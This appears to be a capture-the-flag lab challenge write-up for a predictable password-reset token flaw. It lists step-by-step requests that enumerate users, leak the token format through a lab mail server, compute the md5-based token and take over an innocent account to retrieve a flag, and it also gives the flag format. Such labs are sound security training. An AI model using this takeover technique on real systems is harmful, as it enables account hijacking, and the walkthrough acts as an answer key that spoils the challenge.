# AUTH / ResetTokenPredictable — Keyhole

Bug: reset tokens are `md5(username + ':' + SECRET_SUFFIX)[0:12]` with a
**static** suffix — fully predictable from the username alone. `POST /forgot`
additionally enumerates users (folded prerequisite, arch §7.3).

Why exploitable: request a reset for **your own tester account** and read the
mail at `mail.target.lab:8119` — the dev note in the mail body leaks the token
format including the suffix.

Intended path:
1. `GET /api/users` → note the innocent account `usr_…` (role `innocent`).
2. `POST /forgot {"username":"0xnhsec"}` → open the mail at
   `http://mail.target.lab:8119/` → read the token + format note.
3. `POST /forgot {"username":"usr_…"}` → response confirms the account exists
   (enumeration); customer mail routes externally, but the token row now exists.
4. Compute `md5("<innocent-username>:vlh-lab")[0:12]` — the innocent account's
   predictable token.
5. `POST /reset {"token":"<predicted>","new_password":"x"}` → session with
   `auth_method=reset` for the innocent account.
6. `GET /flag` → `DSLTV{AUTH-ResetTokenPredictable-<n>}` (server checks
   innocent identity + reset provenance).

Flag format: `DSLTV{AUTH-ResetTokenPredictable-<digits>}` — regenerated each boot.
